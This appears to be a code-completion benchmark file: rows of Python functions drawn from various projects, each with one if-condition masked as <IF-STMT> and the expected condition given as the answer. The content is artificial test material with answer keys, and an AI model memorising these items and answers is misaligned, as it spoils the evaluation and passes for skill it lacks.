1055,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_app_id(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_num_memcacheg_backends(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 16 :,128
1056,"def try_to_find_osquery(self):<tab>extention = """"<tab>if platform.system() == ""Windows"":<tab><tab>extention = "".exe""<tab>try:<tab><tab>return resources.get_resource(""osqueryi"" + extention)<tab>except IOError as e:<tab><tab># Maybe it is installed on the system.<tab><tab>if platform.system() == ""Windows"":<tab><tab><tab>result = r""c:\ProgramData\osquery\osqueryi.exe""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return result<tab><tab>else:<tab><tab><tab># Try to find it somewhere on the system.<tab><tab><tab>return spawn.find_executable(""osqueryi"")<tab><tab>raise e","if os . access ( result , os . R_OK ) :",178
1057,"def cleanWhitespace(self, val):<tab>val = val.replace(""*"", "" AND "").replace(""  "", "" "")<tab>if re.match(""\S+ \S"", val):<tab><tab>matchs = re.findall(""(?:^|\(| )(.+?)(?:\)| OR| AND|$)"", val)<tab><tab>for strMatch in matchs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>strUnescapeMatch = self.unescapeCharacter(strMatch)<tab><tab><tab><tab>val = val.replace(strMatch, '""{}""'.format(strUnescapeMatch))<tab>return val.strip()","if re . match ( ""\S+ \S"" , strMatch ) :",140
1058,"def keyPressEvent(self, event):<tab>""""""Add up and down arrow key events to built in functionality.""""""<tab>keyPressed = event.key()<tab>if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]:<tab><tab><IF-STMT><tab><tab><tab>self.index = max(0, self.index - 1)<tab><tab>elif keyPressed == Constants.DOWN_KEY:<tab><tab><tab>self.index = min(len(self.completerStrings) - 1, self.index + 1)<tab><tab>elif keyPressed == Constants.TAB_KEY and self.completerStrings:<tab><tab><tab>self.tabPressed()<tab><tab>if self.completerStrings:<tab><tab><tab>self.setTextToCompleterIndex()<tab>super(CueLineEdit, self).keyPressEvent(event)",if keyPressed == Constants . UP_KEY :,192
1059,"def find_parent_for_new_to(self, pos):<tab>""""""Figure out the parent object for something at 'pos'.""""""<tab>for children in self._editable_children:<tab><tab><IF-STMT><tab><tab><tab>return children.find_parent_for_new_to(pos)<tab><tab>if children._start == pos and pos == children._end:<tab><tab><tab>return children.find_parent_for_new_to(pos)<tab>return self",if children . _start <= pos < children . _end :,113
1060,"def get_sentence(self):<tab>while True:<tab><tab>self._seed += 1<tab><tab>all_files = list(self._all_files)<tab><tab>if self._shuffle:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>random.seed(self._seed)<tab><tab><tab>random.shuffle(all_files)<tab><tab>for file_path in all_files:<tab><tab><tab>for ret in self._load_file(file_path):<tab><tab><tab><tab>yield ret<tab><tab>if self._mode == ""test"":<tab><tab><tab>break",if self . _n_gpus > 1 :,134
1061,"def to_multidevice(batch_iter, num_trainer):<tab>""""""to_multidevice""""""<tab>batch_dict = []<tab>for batch in batch_iter():<tab><tab>batch_dict.append(batch)<tab><tab><IF-STMT><tab><tab><tab>yield batch_dict<tab><tab><tab>batch_dict = []<tab>if len(batch_dict) > 0:<tab><tab>log.warning(<tab><tab><tab>""The batch (%s) can't fill all device (%s)""<tab><tab><tab>""which will be discarded."" % (len(batch_dict), num_trainer)<tab><tab>)",if len ( batch_dict ) == num_trainer :,147
1062,"def get_word_parens_range(self, offset, opening=""("", closing="")""):<tab>end = self._find_word_end(offset)<tab>start_parens = self.code.index(opening, end)<tab>index = start_parens<tab>open_count = 0<tab>while index < len(self.code):<tab><tab>if self.code[index] == opening:<tab><tab><tab>open_count += 1<tab><tab>if self.code[index] == closing:<tab><tab><tab>open_count -= 1<tab><tab><IF-STMT><tab><tab><tab>return (start_parens, index + 1)<tab><tab>index += 1<tab>return (start_parens, index)",if open_count == 0 :,160
1063,"def getNodeBySunid(self, sunid):<tab>""""""Return a node from its sunid.""""""<tab><IF-STMT><tab><tab>return self._sunidDict[sunid]<tab>if self.db_handle:<tab><tab>self.getDomainFromSQL(sunid=sunid)<tab><tab>if sunid in self._sunidDict:<tab><tab><tab>return self._sunidDict[sunid]<tab>else:<tab><tab>return None",if sunid in self . _sunidDict :,123
1064,"def get_cabal_in_dir(cabal_dir):<tab>""""""Return .cabal file for cabal directory""""""<tab>for entry in os.listdir(cabal_dir):<tab><tab><IF-STMT><tab><tab><tab>project_name = os.path.splitext(entry)[0]<tab><tab><tab>return (project_name, os.path.join(cabal_dir, entry))<tab>return (None, None)","if entry . endswith ( "".cabal"" ) :",104
1065,"def authenticate(self, username, password):<tab># The user entered an email, so try to log them in by e-mail<tab>emails = ContactValue.objects.filter(<tab><tab>value=username,<tab><tab>field__field_type=""email"",<tab><tab>contact__trash=False,<tab><tab>contact__related_user__isnull=False,<tab>)<tab>for email in emails:<tab><tab>try:<tab><tab><tab>user = email.contact.related_user.user.user<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return user<tab><tab>except:<tab><tab><tab>pass<tab>return None",if user . check_password ( password ) :,147
1066,"def get_art_abs(story_file):<tab>lines = read_text_file(story_file)<tab>lines = [line.lower() for line in lines]<tab>lines = [fix_missing_period(line) for line in lines]<tab>article_lines = []<tab>highlights = []<tab>next_is_highlight = False<tab>for idx, line in enumerate(lines):<tab><tab><IF-STMT><tab><tab><tab>continue  # empty line<tab><tab>elif line.startswith(""@highlight""):<tab><tab><tab>next_is_highlight = True<tab><tab>elif next_is_highlight:<tab><tab><tab>highlights.append(line)<tab><tab>else:<tab><tab><tab>article_lines.append(line)<tab>article = "" "".join(article_lines)<tab>abstract = "" "".join(highlights)<tab>return article, abstract","if line == """" :",194
1067,"def find_token(self):<tab>found = False<tab>while not found:<tab><tab>while self.data[self.index] in "" \t"":<tab><tab><tab>self.index += 1<tab><tab><IF-STMT><tab><tab><tab>while self.data[self.index] != ""\n"":<tab><tab><tab><tab>self.index += 1<tab><tab>if self.data[self.index] == ""\n"":<tab><tab><tab>self.index += 1<tab><tab>else:<tab><tab><tab>found = True","if self . data [ self . index ] == ""#"" :",123
1068,"def parseBamPEFDistributionFile(self, f):<tab>d = dict()<tab>lastsample = []<tab>for line in f[""f""].splitlines():<tab><tab>cols = line.rstrip().split(""\t"")<tab><tab>if cols[0] == ""#bamPEFragmentSize"":<tab><tab><tab>continue<tab><tab>elif cols[0] == ""Size"":<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>s_name = self.clean_s_name(cols[2].rstrip().split(""/"")[-1], f[""root""])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>d[s_name] = dict()<tab><tab><tab><tab>lastsample = s_name<tab><tab><tab>d[s_name].update({self._int(cols[0]): self._int(cols[1])})<tab>return d",if s_name != lastsample :,194
1069,"def get_user_home():<tab>if is_win():<tab><tab><IF-STMT><tab><tab><tab># Need the fully qualified directory<tab><tab><tab>output = (<tab><tab><tab><tab>subprocess.Popen(<tab><tab><tab><tab><tab>[""cygpath"", ""-m"", os.path.expanduser(""~"")],<tab><tab><tab><tab><tab>stdout=subprocess.PIPE,<tab><tab><tab><tab><tab>stderr=subprocess.STDOUT,<tab><tab><tab><tab>)<tab><tab><tab><tab>.communicate()[0]<tab><tab><tab><tab>.rstrip()<tab><tab><tab>)<tab><tab><tab>return output<tab><tab>else:<tab><tab><tab>return os.environ[""USERPROFILE""]<tab>else:<tab><tab>return os.path.expanduser(""~"")","if sys . platform == ""cygwin"" :",164
1070,"def _grouping_intervals(grouping):<tab>last_interval = None<tab>for interval in grouping:<tab><tab># if grouping is -1, we are done<tab><tab>if interval == CHAR_MAX:<tab><tab><tab>return<tab><tab># 0: re-use last group ad infinitum<tab><tab><IF-STMT><tab><tab><tab>if last_interval is None:<tab><tab><tab><tab>raise ValueError(""invalid grouping"")<tab><tab><tab>while True:<tab><tab><tab><tab>yield last_interval<tab><tab>yield interval<tab><tab>last_interval = interval",if interval == 0 :,124
1071,def remove_duplicates(model):<tab>for struct in model.structs:<tab><tab>fields = []<tab><tab>names = []<tab><tab>for field in struct.fields:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>names.append(field.name)<tab><tab><tab><tab>fields.append(field)<tab><tab>struct.fields = fields,if field . name not in names :,83
1072,"def set_multi(self, value):<tab>del self[atype]<tab>for addr in value:<tab><tab># Support assigning dictionary versions of addresses<tab><tab># instead of full Address objects.<tab><tab>if not isinstance(addr, Address):<tab><tab><tab>if atype != ""all"":<tab><tab><tab><tab>addr[""type""] = atype<tab><tab><tab><IF-STMT><tab><tab><tab><tab>addr[""type""] = addr[""atype""]<tab><tab><tab>addrObj = Address()<tab><tab><tab>addrObj.values = addr<tab><tab><tab>addr = addrObj<tab><tab>self.append(addr)","elif ""atype"" in addr and ""type"" not in addr :",146
1073,"def import_directives():<tab>files_list = os.listdir(os.path.dirname(__file__))<tab>for directive_file in files_list:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>__import__(<tab><tab><tab>""gixy.directives."" + os.path.splitext(directive_file)[0], None, None, [""""]<tab><tab>)","if not directive_file . endswith ( "".py"" ) or directive_file . startswith ( ""_"" ) :",99
1074,"def _get_all_tasks():<tab>proc = Popen([""yarn"", ""--help""], stdout=PIPE)<tab>should_yield = False<tab>for line in proc.stdout.readlines():<tab><tab>line = line.decode().strip()<tab><tab><IF-STMT><tab><tab><tab>should_yield = True<tab><tab><tab>continue<tab><tab>if should_yield and ""- "" in line:<tab><tab><tab>yield line.split("" "")[-1]","if ""Commands:"" in line :",103
1075,"def _waitFakenetStopped(self, timeoutsec=None):<tab>retval = False<tab>while True:<tab><tab>if self._confirmFakenetStopped():<tab><tab><tab>retval = True<tab><tab><tab>break<tab><tab>time.sleep(1)<tab><tab><IF-STMT><tab><tab><tab>timeoutsec -= 1<tab><tab><tab>if timeoutsec <= 0:<tab><tab><tab><tab>break<tab>return retval",if timeoutsec is not None :,97
1076,"def parse_compare_fail(<tab>string,<tab>rex=re.compile(<tab><tab>r""^(?P<field>min|max|mean|median|stddev|iqr):""<tab><tab>r""((?P<percentage>[0-9]?[0-9])%|(?P<difference>[0-9]*\.?[0-9]+([eE][-+]?[""<tab><tab>r""0-9]+)?))$""<tab>),):<tab>m = rex.match(string)<tab>if m:<tab><tab>g = m.groupdict()<tab><tab><IF-STMT><tab><tab><tab>return PercentageRegressionCheck(g[""field""], int(g[""percentage""]))<tab><tab>elif g[""difference""]:<tab><tab><tab>return DifferenceRegressionCheck(g[""field""], float(g[""difference""]))<tab>raise argparse.ArgumentTypeError(""Could not parse value: %r."" % string)","if g [ ""percentage"" ] :",199
1077,"def get_converter(self, key, default=None):<tab>""""""Gets a converter for the given key.""""""<tab>if key in self._vars:<tab><tab>return self._vars[key].convert<tab># necessary for keys that match regexes, such as `*PATH`s<tab>for k, var in self._vars.items():<tab><tab>if isinstance(k, str):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>converter = var.convert<tab><tab><tab>self._vars[key] = var<tab><tab><tab>break<tab>else:<tab><tab>converter = self._get_default_converter(default=default)<tab>return converter",if k . match ( key ) is not None :,154
1078,"def get_model_params(problem_type: str, hyperparameters):<tab>penalty = hyperparameters.get(""penalty"", L2)<tab>handle_text = hyperparameters.get(""handle_text"", IGNORE)<tab>if problem_type == REGRESSION:<tab><tab>if penalty == L2:<tab><tab><tab>model_class = Ridge<tab><tab><IF-STMT><tab><tab><tab>model_class = Lasso<tab><tab>else:<tab><tab><tab>logger.warning(<tab><tab><tab><tab>""Unknown value for penalty {} - supported types are [l1, l2] - falling back to l2"".format(<tab><tab><tab><tab><tab>penalty<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>penalty = L2<tab><tab><tab>model_class = Ridge<tab>else:<tab><tab>model_class = LogisticRegression<tab>return model_class, penalty, handle_text",elif penalty == L1 :,200
1079,"def __init__(self, content=None, parent=None):<tab>Transformable.__init__(self, content, parent)<tab>self._items = []<tab>for element in content:<tab><tab>if not element.tag.startswith(namespace):<tab><tab><tab>continue<tab><tab>tag = element.tag[len(namespace) :]<tab><tab><IF-STMT><tab><tab><tab>item = Group(element, self)<tab><tab>elif tag == ""path"":<tab><tab><tab>item = Path(element, self)<tab><tab>else:<tab><tab><tab>log.warn(""Unhandled SVG tag (%s)"" % tag)<tab><tab><tab>continue<tab><tab>self._items.append(item)","if tag == ""g"" :",154
1080,"def f_context(args: argparse.Namespace):<tab>choice = args.choice<tab>ctx = utils.get_context()<tab>if choice is None:<tab><tab><IF-STMT><tab><tab><tab>group = ctx.stem<tab><tab><tab>print(f""{group}: {' '.join(utils.get_groups()[group])}"")<tab><tab>else:<tab><tab><tab>print(""Context is not set"")<tab>elif choice == ""none"":  # remove context<tab><tab>ctx and ctx.unlink()<tab>else:  # set context<tab><tab>fname = Path(common.get_config_dir()) / (choice + "".context"")<tab><tab>if ctx:<tab><tab><tab>ctx.rename(fname)<tab><tab>else:<tab><tab><tab>open(fname, ""w"").close()",if ctx :,175
1081,"def check_checksum(self):<tab>""""""fix media checksums""""""<tab>self.progress.set_pass(<tab><tab>_(""Updating checksums on media""), len(self.db.get_media_handles())<tab>)<tab>for objectid in self.db.get_media_handles():<tab><tab>self.progress.step()<tab><tab>obj = self.db.get_media_from_handle(objectid)<tab><tab>full_path = media_path_full(self.db, obj.get_path())<tab><tab>new_checksum = create_checksum(full_path)<tab><tab><IF-STMT><tab><tab><tab>logging.info(""checksum: updating "" + obj.gramps_id)<tab><tab><tab>obj.checksum = new_checksum<tab><tab><tab>self.db.commit_media(obj, self.trans)",if new_checksum != obj . checksum :,196
1082,"def get_default_backend(self, user_backends):<tab>retval = None<tab>n_defaults = 0<tab>for name in user_backends:<tab><tab>args = user_backends.get(name)<tab><tab>if args.get(""default"", False):<tab><tab><tab>n_defaults = n_defaults + 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>retval = name<tab>return (retval, n_defaults)",if retval is None :,100
1083,"def on_mqtt_packet_received(self, *args, **kwargs):<tab>packet = kwargs.get(""packet"")<tab>if packet:<tab><tab>packet_size = packet.bytes_length<tab><tab>self._stats[STAT_BYTES_RECEIVED] += packet_size<tab><tab>self._stats[STAT_MSG_RECEIVED] += 1<tab><tab><IF-STMT><tab><tab><tab>self._stats[STAT_PUBLISH_RECEIVED] += 1",if packet . fixed_header . packet_type == PUBLISH :,110
1084,"def func(self):<tab>if self.schema:<tab><tab>d = {}<tab><tab>for key in self._schema_keys:<tab><tab><tab>d[key] = getattr(self, key)<tab><tab># arbitrary keys<tab><tab><IF-STMT><tab><tab><tab>akeys = set(self._data.keys()) - set(d.keys())<tab><tab><tab>for akey in akeys:<tab><tab><tab><tab>d[akey] = self._data[akey]<tab><tab>return d<tab>else:<tab><tab>return None",if self . _data :,125
1085,"def endElement(self, name, value, connection):<tab>if name == ""vpcId"":<tab><tab>self.vpc_id = value<tab>elif name == ""value"":<tab><tab>if value == ""true"":<tab><tab><tab>value = True<tab><tab>else:<tab><tab><tab>value = False<tab><tab><IF-STMT><tab><tab><tab>self.enable_dns_hostnames = value<tab><tab>elif self._current_attr == ""enableDnsSupport"":<tab><tab><tab>self.enable_dns_support = value","if self . _current_attr == ""enableDnsHostnames"" :",125
1086,"def keyPressEvent(self, event):<tab>if event.key() in (Qt.Key_Right, Qt.Key_Left):<tab><tab>direction = 1<tab><tab><IF-STMT><tab><tab><tab>direction = -1<tab><tab>if event.modifiers() == Qt.ShiftModifier:<tab><tab><tab>print(""shift"")<tab><tab><tab>direction *= 10<tab><tab>self.timeline.setValue(self.timeline.value() + direction)<tab>else:<tab><tab>super(VideoPlayerWidget, self).keyPressEvent(event)",if event . key ( ) == Qt . Key_Left :,131
1087,"def find_config(pipeline_config_path: Union[str, Path]) -> Path:<tab>if not Path(pipeline_config_path).is_file():<tab><tab>configs = [<tab><tab><tab>c<tab><tab><tab>for c in Path(__file__).parent.parent.parent.glob(<tab><tab><tab><tab>f""configs/**/{pipeline_config_path}.json""<tab><tab><tab>)<tab><tab><tab>if str(c.with_suffix("""")).endswith(pipeline_config_path)<tab><tab>]  # a simple way to not allow * and ?<tab><tab><IF-STMT><tab><tab><tab>log.info(f""Interpreting '{pipeline_config_path}' as '{configs[0]}'"")<tab><tab><tab>pipeline_config_path = configs[0]<tab>return Path(pipeline_config_path)",if configs :,184
1088,"def list_translations(dirname):<tab>if not os.path.isdir(dirname):<tab><tab>return []<tab>result = []<tab>for entry in scandir(dirname):<tab><tab>locale_dir = os.path.join(entry.path, ""LC_MESSAGES"")<tab><tab>if not os.path.isdir(locale_dir):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>result.append(Locale.parse(entry.name))<tab>return result","if any ( filter ( lambda x : x . name . endswith ( "".mo"" ) , scandir ( locale_dir ) ) ) :",131
1089,"def writeTo(self, writable):<tab>chunkStart = 0<tab>fileSize = blob.properties.content_length<tab>while chunkStart < fileSize:<tab><tab>chunkEnd = chunkStart + outer_self._maxAzureBlockBytes - 1<tab><tab>buf = container.get_blob_to_bytes(<tab><tab><tab>blob_name=str(jobStoreFileID), start_range=chunkStart, end_range=chunkEnd<tab><tab>).content<tab><tab><IF-STMT><tab><tab><tab>buf = encryption.decrypt(buf, outer_self.keyPath)<tab><tab>writable.write(buf)<tab><tab>chunkStart = chunkEnd + 1",if encrypted :,148
1090,"def get_extractor(name):<tab>for extractor in ALL_EXTRACTORS:<tab><tab><IF-STMT><tab><tab><tab>module = import_module(<tab><tab><tab><tab>""anime_downloader.extractors.{}"".format(extractor[""modulename""])<tab><tab><tab>)<tab><tab><tab>return getattr(module, extractor[""class""])","if extractor [ ""regex"" ] in name . lower ( ) :",84
1091,"def updateSize(self):<tab>if self.size is not None:<tab><tab>return<tab>height = 0<tab>width = 0<tab>for row in range(self.layout.rowCount()):<tab><tab>row_height = 0<tab><tab>col_witdh = 0<tab><tab>for col in range(self.layout.columnCount()):<tab><tab><tab>item = self.layout.itemAt(row, col)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>col_witdh += item.width() + 3<tab><tab><tab><tab>row_height = max(row_height, item.height())<tab><tab>width = max(width, col_witdh)<tab><tab>height += row_height<tab>self.setGeometry(0, 0, width, height)<tab>return",if item :,176
1092,"def close_group(self):<tab>""""""Closes a grouping for previous filters""""""<tab>if self._filters:<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""Not enough open groups to close."")<tab><tab>if isinstance(self._filters[-1], ChainOperator):<tab><tab><tab>flt_sentence = self._filters[-2]<tab><tab>else:<tab><tab><tab>flt_sentence = self._filters[-1]<tab><tab>flt_sentence[1] = flt_sentence[1] + "")""  # closing the group<tab><tab>self._close_group_flag.append(False)  # flag a close group was added<tab>else:<tab><tab>raise RuntimeError(""No filters present. Can't close a group"")<tab>return self",if len ( self . _open_group_flag ) < ( len ( self . _close_group_flag ) + 1 ) :,191
1093,"def test_name_conflicts():<tab># Test that we handle participants having the same name correctly.<tab>ev = fake_event()<tab>ev2 = fake_event()<tab># Office365 sets the name to the email address when it's<tab># not available.<tab>ev2.participants[0][""email""] = None<tab>ev2.participants[0][""status""] = ""yes""<tab>merged_participants = ev._partial_participants_merge(ev2)<tab>assert len(merged_participants) == 2<tab>for participant in merged_participants:<tab><tab><IF-STMT><tab><tab><tab>assert participant[""status""] == ""yes""<tab><tab>else:<tab><tab><tab>assert participant[""name""] == ""Ronald Zubar""","if participant [ ""email"" ] is None :",183
1094,"def set_idle(view, idle):<tab>vid = view.id()<tab>current_idle = vid in State[""idle_views""]<tab>if idle != current_idle:<tab><tab><IF-STMT><tab><tab><tab>State[""idle_views""].add(vid)<tab><tab>else:<tab><tab><tab>State[""idle_views""].discard(vid)<tab><tab>toggle_demoted_regions(view, idle)",if idle :,95
1095,"def _deserialize(self, value, attr, data, **kwargs):<tab>if isinstance(value, str):<tab><tab>return [value, 0, 0]<tab>if isinstance(value, list) and len(value) == 3:<tab><tab>condition = (<tab><tab><tab>isinstance(value[0], str)<tab><tab><tab>and isinstance(value[1], int)<tab><tab><tab>and isinstance(value[1], int)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return value<tab>raise ValidationError(""This field expects a str or a list of [str, int, int]."")",if condition :,134
1096,"def _struct(self, fields):<tab>result = {}<tab>for field in fields:<tab><tab>if field[0] == ""__parent"":<tab><tab><tab>parent = self.instance(field[1])<tab><tab><tab>if isinstance(parent, dict):<tab><tab><tab><tab>result.update(parent)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = parent<tab><tab><tab>else:<tab><tab><tab><tab>result[field[0]] = parent<tab><tab>else:<tab><tab><tab>result[field[0]] = self.instance(field[1])<tab>return result",elif len ( fields ) == 1 :,136
1097,"def validate(self):<tab>if ""accounts"" in self.data and self.data[""accounts""] == ""matched"":<tab><tab>found = False<tab><tab>for f in self.manager.iter_filters():<tab><tab><tab>if isinstance(f, AmiCrossAccountFilter):<tab><tab><tab><tab>found = True<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>raise PolicyValidationError(<tab><tab><tab><tab>""policy:%s filter:%s with matched requires cross-account filter""<tab><tab><tab><tab>% (self.manager.ctx.policy.name, self.type)<tab><tab><tab>)",if not found :,137
1098,"def add_rule6(self, rule):<tab>if self.cleared:<tab><tab>return<tab>self._lock.acquire()<tab>try:<tab><tab>self._other6.append(rule)<tab><tab><IF-STMT><tab><tab><tab>self._insert_iptables_rule(rule, ipv6=True)<tab>finally:<tab><tab>self._lock.release()","if not self . _exists_iptables_rule ( rule , ipv6 = True ) :",100
1099,"def load_grammar(self, *args):<tab>""Load a grammar from a pickle file""<tab>filename = askopenfilename(<tab><tab>filetypes=self.GRAMMAR_FILE_TYPES, defaultextension="".cfg""<tab>)<tab>if not filename:<tab><tab>return<tab>try:<tab><tab><IF-STMT><tab><tab><tab>with open(filename, ""rb"") as infile:<tab><tab><tab><tab>grammar = pickle.load(infile)<tab><tab>else:<tab><tab><tab>with open(filename, ""r"") as infile:<tab><tab><tab><tab>grammar = CFG.fromstring(infile.read())<tab><tab>self.set_grammar(grammar)<tab>except Exception as e:<tab><tab>tkinter.messagebox.showerror(<tab><tab><tab>""Error Loading Grammar"", ""Unable to open file: %r"" % filename<tab><tab>)","if filename . endswith ( "".pickle"" ) :",186
1100,"def _join_printed_types(self, types):<tab>""""""Pretty-print the union of the printed types.""""""<tab>types = sorted(set(types))  # dedup<tab>if len(types) == 1:<tab><tab>return next(iter(types))<tab>elif types:<tab><tab><IF-STMT><tab><tab><tab>types.remove(""None"")<tab><tab><tab>return ""Optional[%s]"" % self._join_printed_types(types)<tab><tab>else:<tab><tab><tab>return ""Union[%s]"" % "", "".join(types)<tab>else:<tab><tab>return ""nothing""","if ""None"" in types :",138
1101,"def __init__(self, **kwargs):<tab>for key, val in kwargs.items():<tab><tab>field = getattr(self.__class__, key, None)<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""Field %r returned from raw SQL query does not have ""<tab><tab><tab><tab>""a column defined in the model"" % key<tab><tab><tab>)<tab><tab>setattr(self, field.get_attname() or key, field.to_python(val))",if field is None :,113
1102,"def get_transaction_execution_results(self, batch_signature):<tab>with self._condition:<tab><tab>batch_status = self._batch_statuses.get(batch_signature)<tab><tab><IF-STMT><tab><tab><tab>return None<tab><tab>annotated_batch = self._batch_by_id.get(batch_signature)<tab><tab>if annotated_batch is None:<tab><tab><tab>return None<tab><tab>results = []<tab><tab>for txn in annotated_batch.batch.transactions:<tab><tab><tab>result = self._txn_results.get(txn.header_signature)<tab><tab><tab>if result is not None:<tab><tab><tab><tab>results.append(result)<tab><tab>return results",if batch_status is None :,161
1103,"def _check_params(self) -> None:<tab>if self.augmentation and self.ratio <= 0:<tab><tab>raise ValueError(""The augmentation ratio must be positive."")<tab>if self.clip_values is not None:<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""`clip_values` should be a tuple of 2 floats or arrays containing the allowed data range.""<tab><tab><tab>)<tab><tab>if np.array(self.clip_values[0] >= self.clip_values[1]).any():<tab><tab><tab>raise ValueError(""Invalid `clip_values`: min >= max."")",if len ( self . clip_values ) != 2 :,146
1104,def ping_all():<tab>for l in _all_listeners.values():<tab><tab>count = l.receiver.count()<tab><tab>if count:<tab><tab><tab>for dev in l.receiver:<tab><tab><tab><tab>dev.ping()<tab><tab><tab><tab>l._status_changed(dev)<tab><tab><tab><tab>count -= 1<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break,if not count :,92
1105,"def on_btOK_clicked(self, *a):<tab>""""""Handler for OK button""""""<tab>if self.ac_callback is not None:<tab><tab>self._set_title()<tab><tab>if self._mode == ActionEditor.AEC_MENUITEM:<tab><tab><tab>self.ac_callback(self.id, self)<tab><tab>else:<tab><tab><tab>a = self.generate_modifiers(<tab><tab><tab><tab>self._action, self._selected_component.NAME == ""custom""<tab><tab><tab>)<tab><tab><tab>self.ac_callback(self.id, a)<tab><tab><tab>self.ac_callback = None<tab><tab><IF-STMT><tab><tab><tab>self._selected_component.on_ok(a)<tab>self.close()",if self . _selected_component :,180
1106,"def apply_ssl(self, request):<tab>if self.ssl_protocol:<tab><tab><IF-STMT><tab><tab><tab>self.sslconf.setProtocol(self.ssl_protocol)<tab><tab><tab>QSslConfiguration.setDefaultConfiguration(self.sslconf)<tab>request.setSslConfiguration(self.sslconf)<tab>return request",if self . sslconf . protocol ( ) != self . ssl_protocol :,91
1107,"def _iter_process_args(mapping, pid, max_depth):<tab>""""""Iterator to traverse up the tree, yielding each process's argument list.""""""<tab>for _ in range(max_depth):<tab><tab>try:<tab><tab><tab>proc = mapping[pid]<tab><tab>except KeyError:  # We've reached the root process. Give up.<tab><tab><tab>break<tab><tab><IF-STMT>  # Persumably the process should always have a name?<tab><tab><tab>yield proc.args<tab><tab>pid = proc.ppid  # Go up one level.",if proc . args :,127
1108,"def store_data(self, store_loc, **kwargs):<tab>""""""Put arrays to store""""""<tab># print(store_loc)<tab>g = self.store.create_group(store_loc)<tab>for (<tab><tab>k,<tab><tab>v,<tab>) in kwargs.items():<tab><tab># print(type(v[0]))<tab><tab># print(k)<tab><tab>if type(v) == list:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if type(v[0]) is np.str_ or type(v[0]) is str:<tab><tab><tab><tab><tab>v = [a.encode(""utf8"") for a in v]<tab><tab>g.create_dataset(k, data=v, compression=self.clib, compression_opts=self.clev)",if len ( v ) != 0 :,191
1109,"def add_system_info_creds_to_config(creds):<tab>for user in creds:<tab><tab>ConfigService.creds_add_username(creds[user][""username""])<tab><tab>if ""password"" in creds[user] and creds[user][""password""]:<tab><tab><tab>ConfigService.creds_add_password(creds[user][""password""])<tab><tab>if ""lm_hash"" in creds[user] and creds[user][""lm_hash""]:<tab><tab><tab>ConfigService.creds_add_lm_hash(creds[user][""lm_hash""])<tab><tab><IF-STMT><tab><tab><tab>ConfigService.creds_add_ntlm_hash(creds[user][""ntlm_hash""])","if ""ntlm_hash"" in creds [ user ] and creds [ user ] [ ""ntlm_hash"" ] :",175
1110,"def _format_arg(self, name, spec, value):<tab>if name == ""title"":<tab><tab><IF-STMT><tab><tab><tab>return ""--title""<tab><tab>elif isinstance(value, str):<tab><tab><tab>return ""--title --title_text %s"" % (value,)<tab><tab>else:<tab><tab><tab>raise ValueError('Unknown value for ""title"" argument: ' + str(value))<tab>return super(Pik, self)._format_arg(name, spec, value)","if isinstance ( value , bool ) and value :",118
1111,"def handle_friend(self):<tab>tokens, last = self._get_var_tokens_up_to(False, ""("", "";"")<tab>if last.name == ""("":<tab><tab>tokens.append(last)<tab><tab>self._add_back_tokens(tokens)<tab><tab>token = self._get_next_token()<tab><tab>while token.name in (""inline"", ""typename"", ""::""):<tab><tab><tab>token = self._get_next_token()<tab><tab>result = self._generate_one(token)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>tokens = tokens[1:]<tab><tab>result = self.converter.to_type(tokens)[0]<tab>assert result<tab>return Friend(result.start, result.end, result, self.namespace_stack)","if tokens [ 0 ] . name == ""class"" :",188
1112,"def list_subtitles(self, video, languages):<tab>season = None<tab>episodes = []<tab>if isinstance(video, Episode):<tab><tab>titles = [video.series] + video.alternative_series<tab><tab>season = video.season<tab><tab>episodes = video.episodes<tab>else:<tab><tab>titles = [video.title] + video.alternative_titles<tab>for title in titles:<tab><tab>subtitles = [<tab><tab><tab>s<tab><tab><tab>for l in languages<tab><tab><tab>for s in self.query(<tab><tab><tab><tab>l, title, season=season, episodes=episodes, year=video.year<tab><tab><tab>)<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>return subtitles<tab>return []",if subtitles :,183
1113,"def on_write_needed(self, nbytes, underflow):<tab>if underflow:<tab><tab>self._handle_underflow()<tab>else:<tab><tab>self._write_to_stream(nbytes)<tab># Asynchronously update time<tab>if self._events:<tab><tab><IF-STMT><tab><tab><tab>self._time_sync_operation.delete()<tab><tab><tab>self._time_sync_operation = None<tab><tab>if self._time_sync_operation is None:<tab><tab><tab>assert _debug(""PulseAudioPlayer: trigger timing info update"")<tab><tab><tab>self._time_sync_operation = self.stream.update_timing_info(<tab><tab><tab><tab>self._process_events<tab><tab><tab>)",if self . _time_sync_operation is not None and self . _time_sync_operation . is_done :,187
